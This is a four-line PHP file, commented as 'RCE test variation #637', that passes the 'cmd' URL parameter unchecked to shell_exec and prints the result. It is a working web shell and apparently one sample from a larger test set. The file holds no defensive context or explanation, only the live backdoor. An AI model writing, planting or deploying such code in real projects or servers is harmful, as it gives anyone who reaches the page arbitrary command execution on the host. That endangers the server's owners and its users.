<?php
// RCE test variation #637
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>